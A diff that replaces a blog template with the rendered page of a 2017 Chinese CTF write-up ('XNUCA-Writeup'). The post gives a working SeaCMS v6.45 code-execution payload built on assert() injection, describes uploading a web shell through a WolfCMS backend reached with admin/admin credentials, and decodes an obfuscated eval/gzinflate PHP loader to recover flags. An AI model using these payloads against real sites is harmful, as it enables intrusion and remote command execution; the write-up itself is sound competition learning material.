@@ -1,23 +1,468 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="mask-icon" href="https://github.com/Windylh/image/raw/master/icon.ico" color="#222">
 
-{% block title %}{{ page.title }} | {{ title }}{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block page_class %}page-post-detail{% endblock %}
 
-{% block content %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="#No.8 看视频真嗨皮（读：50分，写：100分）1234提交关键字词：一档靶标题&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;周末看个电影放松一下吧！ 海洋cms v6.45前台getshell漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XNUCA-Writeup">
+<meta property="og:url" content="http://yoursite.com/2017/09/18/XNUCA-Writeup/index.html">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="#No.8 看视频真嗨皮（读：50分，写：100分）1234提交关键字词：一档靶标题&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;周末看个电影放松一下吧！ 海洋cms v6.45前台getshell漏洞">
+<meta property="og:locale">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms2.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms3.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/zrk1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/zrk2.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.11.25/xnuca-1.png">
+<meta property="article:published_time" content="2017-09-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2018-11-01T10:53:09.253Z">
+<meta property="article:author" content="Windylh">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png">
+
+<link rel="canonical" href="http://yoursite.com/2017/09/18/XNUCA-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>XNUCA-Writeup | Windylh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Windylh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/XNUCA-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XNUCA-Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:53:09" itemprop="dateModified" datetime="2018-11-01T18:53:09+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="No-8-看视频真嗨皮（读：50分，写：100分）"><a href="#No-8-看视频真嗨皮（读：50分，写：100分）" class="headerlink" title="#No.8 看视频真嗨皮（读：50分，写：100分）"></a>#No.8 看视频真嗨皮（读：50分，写：100分）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提交</span><br><span class="line">关键字词：一档靶标题</span><br><span class="line">===============================================================</span><br><span class="line">周末看个电影放松一下吧！</span><br></pre></td></tr></table></figure>
+<p><a href="http://0day5.com/archives/4249/">海洋cms v6.45前台getshell漏洞</a></p>
+<span id="more"></span>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url：http://6f781364dedf5dc1eb877079f415877b.xnuca.cn/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//</span><br><span class="line">post:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>phpinfo()正常执行。</p>
+<p>通过system函数执行命令。<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png" alt="1"><br>找flag位置<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms1.png" alt="2"><br>查询flag<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms2.png" alt="3"><br>创建文件<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms3.png" alt="4"></p>
+<h2 id="No-23-找入口（读：100分，写：200分）"><a href="#No-23-找入口（读：100分，写：200分）" class="headerlink" title="#No.23 找入口（读：100分，写：200分）"></a>#No.23 找入口（读：100分，写：200分）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提交</span><br><span class="line">关键字词：二档靶标题</span><br><span class="line">===============================================================</span><br><span class="line">本站的基本职能是什么</span><br></pre></td></tr></table></figure>
+<p>找到网站后台，发现后台是弱口令<code>username=admin&amp;password=admin</code>。</p>
+<p><a href="http://www.freebuf.com/articles/web/138640.html">wolfcms 任意文件上传</a></p>
+<p>后台直接上传shell，根据前台的logo找到对应的路径。</p>
+<p>按照上一题的套路查看flag，写文件。<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk1.png" alt="5"><br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk2.png" alt="6"></p>
+<h1 id="第三轮"><a href="#第三轮" class="headerlink" title="第三轮"></a>第三轮</h1><h3 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h3><p>####操作内容<br>根据提示，访问<code>main.js</code>，找到作者信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> *  main.js v1.0</span><br><span class="line"> *</span><br><span class="line"> *  2017/5/20</span><br><span class="line"> *  author l1Kai@youngin.uu.me</span><br><span class="line"> *  </span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
+<p>github找到作者<code>https://github.com/l1Kai/user</code></p>
+<p>获得config.php和flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$payload</span>=<span class="string">&quot;fVJNc9sgEP1BuUhOPC2HHmxsbJBCDAgkc5NRJCtCHx3HVsivL5aTaZtDDgwDu++93be7Yj2FHbEmU4NpZZ+FYC0UKTP30MUzHR5aGuQpOMfdsjfQDE9jEK3Y0OhUDwefjxsOxRokCuITflk76h7G+GVxfhR4ytUb1ebp3EawWDOrEq5wF0PTRcmJwpZb3dqzFlXH14QxRRPixo645se/GiTgMGkQ5cKciDNfeUUSAMkRIcS9lVnAibSgjGt8ieuHC67/58K2QMwCKRR/5AKfyF1eHe/auoVfeQmTDShFoDSuxzqq+9+e7+x5hyf384K3Ra8zYvHGvmO0FEkIYq6aaucWFFZBlKf7KoKo0xkvDynq8pSW3uNLsVHv2awY964aIhZEz14Tw0XleVoMq6NOw7HYNj1BYMsVm3Km+Nb7Vfsb3s5HvMKroNqnvDGzt6OZHa0Jge9VjRHkJQ+UnHyecEuwYv2E/ajNHrJl8CyqJguXOxl+q8WSkMrvtOS0A1evbxolu+5J/4lf+RnFQsrrG+ANavSWnvYZ9R7S0ntuDfR1BHSXBK+Ei788Hiu4Qoorr/8dNiRIKoWufVzneNMfnM5QmPs5RYjskpCvZdOciQMX05qLmYVH0/F5HNLXfUa8F/OXwwa9Gzcf8+3itqMdteaeDofZvDT33Oezfvr3M9bZcShWp19/AA==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.*/e&#x27;</span>,<span class="string">&quot;\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x24\x70\x61\x79\x6c\x6f\x61\x64\x29\x2c\x30\x29\x29\x29&quot;</span>,<span class="string">&#x27;.&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">flag&#123;e76cd8c1-d747-<span class="number">4259</span>-aaac-bc36efe62462&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="FLAG值"><a href="#FLAG值" class="headerlink" title="FLAG值"></a>FLAG值</h4><p>flag{e76cd8c1-d747-4259-aaac-bc36efe62462}</p>
+<h3 id="0x01信息分析"><a href="#0x01信息分析" class="headerlink" title="0x01信息分析"></a>0x01信息分析</h3><h4 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容"></a>操作内容</h4><p>用python输出\x部分。</p>
+<p><code>eval(base64_decode(gzinflate(base64_decode($payload),0)))</code></p>
+<p>php解密</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$payload</span>=<span class="string">&quot;fVJNc9sgEP1BuUhOPC2HHmxsbJBCDAgkc5NRJCtCHx3HVsivL5aTaZtDDgwDu++93be7Yj2FHbEmU4NpZZ+FYC0UKTP30MUzHR5aGuQpOMfdsjfQDE9jEK3Y0OhUDwefjxsOxRokCuITflk76h7G+GVxfhR4ytUb1ebp3EawWDOrEq5wF0PTRcmJwpZb3dqzFlXH14QxRRPixo645se/GiTgMGkQ5cKciDNfeUUSAMkRIcS9lVnAibSgjGt8ieuHC67/58K2QMwCKRR/5AKfyF1eHe/auoVfeQmTDShFoDSuxzqq+9+e7+x5hyf384K3Ra8zYvHGvmO0FEkIYq6aaucWFFZBlKf7KoKo0xkvDynq8pSW3uNLsVHv2awY964aIhZEz14Tw0XleVoMq6NOw7HYNj1BYMsVm3Km+Nb7Vfsb3s5HvMKroNqnvDGzt6OZHa0Jge9VjRHkJQ+UnHyecEuwYv2E/ajNHrJl8CyqJguXOxl+q8WSkMrvtOS0A1evbxolu+5J/4lf+RnFQsrrG+ANavSWnvYZ9R7S0ntuDfR1BHSXBK+Ei788Hiu4Qoorr/8dNiRIKoWufVzneNMfnM5QmPs5RYjskpCvZdOciQMX05qLmYVH0/F5HNLXfUa8F/OXwwa9Gzcf8+3itqMdteaeDofZvDT33Oezfvr3M9bZcShWp19/AA==&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>),<span class="number">0</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/function.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DBHOST&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBUSER&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPASS&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBNAME&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOTDRI&#x27;</span>,<span class="keyword">__DIR__</span>.<span class="string">&quot;/../&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;WEB_TITLE&quot;</span>,<span class="string">&#x27;标题&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;PRO_KEY&quot;</span>,<span class="string">&quot;***....&quot;</span>);<span class="comment">// where is PRO_KEY ? </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_GET</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_POST</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(ROOTDRI.<span class="string">&#x27;/org/smarty/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看之前的历史提交，找到最初的config.php，修改php输出执行的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_rZBFc5</span>(<span class="params"><span class="variable">$_AXxuMn</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keyStr</span> = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">    <span class="variable">$chr1</span> = <span class="variable">$chr2</span> = <span class="variable">$chr3</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$enc1</span> = <span class="variable">$enc2</span> = <span class="variable">$enc3</span> = <span class="variable">$enc4</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$_AXxuMn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;[^A-Za-z0-9\\+\\/\\=]&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_AXxuMn</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$enc1</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$keyStr</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_AXxuMn</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">        <span class="variable">$enc2</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$keyStr</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_AXxuMn</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">        <span class="variable">$enc3</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$keyStr</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_AXxuMn</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">        <span class="variable">$enc4</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$keyStr</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_AXxuMn</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">        <span class="variable">$chr1</span> = <span class="variable">$enc1</span> &lt;&lt; <span class="number">2</span> | <span class="variable">$enc2</span> &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        <span class="variable">$chr2</span> = (<span class="variable">$enc2</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span> | <span class="variable">$enc3</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$chr3</span> = (<span class="variable">$enc3</span> &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span> | <span class="variable">$enc4</span>;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$output</span> . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$chr1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$enc3</span> != <span class="number">64</span>) &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="variable">$output</span> . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$chr2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$enc4</span> != <span class="number">64</span>) &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="variable">$output</span> . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$chr3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$chr1</span> = <span class="variable">$chr2</span> = <span class="variable">$chr3</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$enc1</span> = <span class="variable">$enc2</span> = <span class="variable">$enc3</span> = <span class="variable">$enc4</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_AXxuMn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_g1S4Ve</span>(<span class="params"><span class="variable">$_XJwGpK</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">_rZBFc5</span>(<span class="variable">$_XJwGpK</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_Xvtafz</span>(<span class="params"><span class="variable">$_4LYEpc</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">gzinflate</span>(<span class="variable">$_4LYEpc</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_ehljDM</span>(<span class="params"><span class="variable">$_j045Zz</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="variable">$_j045Zz</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_Za0oXi</span> = <span class="string">&quot;fVNNk6IwEP1BcwHU2uWwBw2gCZidhBAgN4zDhwkfVY4y+Os34kzt7hw8pFKp7vde9+uOR/pr2Gzawzbo3m7KwaeNym9kjNh6wjf4jj3aCmDXe4/YERMat/koTmopWlzvd1YVNj8x6JCWGR9km/SZ7foxR2U2LbvIEfahxVaRupeo2/QSyOH3aIUeGZRIxXAw+VBREPsu4wCe4cmf8LQco9P6so/hnCu2vC3SlQ7B0SeaM8phFwHZheyMQUu1aPVFxFVHfUQIxwxNY4cm9eNfDWRRwFSAaSzPaJLfeWNmuQkNEELTR5lZFCXaLaMGXqNmeYXN/1xQHwOi3STmdE9jeEYvRVW/tE0LvvMikii3jC0uYDM2e7Ze7NN8iR3e5E4+iRaujI+OOPkLvOWnnAVaMKSElzdzb5UVFmlehSDoREbLQxp0RYpL4/P1uOW3zDmO+VQNIbHCN6MLwbqCW91CUNUitcfjTvUocHeUkzlnju8Mb2Nu8Dif8Qp6VpWnVEnno5ZOraXtmn75GAJaUosncz0zbuN6pJ+xn7XpQ7ax3uJKZfbmNbGfahFm4+SZVjLvwd3vh0ZJ7rvSf+E9M6coTpL724XbQIkdPucZ7kWGS+O7lsDUYeFXZr0jGv/lMdiY8oBTbvSfYW0UJJwH9z7us3zoD5PIArvIkA4D9Mps6idKXdDkXmUrr9Kxa9nRVWTj9zxDxovVyfylm5xWY7FbP/a0w1ou8HBwVqVcUJNP+q8Zi6wejt751x8=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_g1S4Ve</span>(<span class="title function_ invoke__">_Xvtafz</span>(<span class="title function_ invoke__">_g1S4Ve</span>(<span class="variable">$_Za0oXi</span>),<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
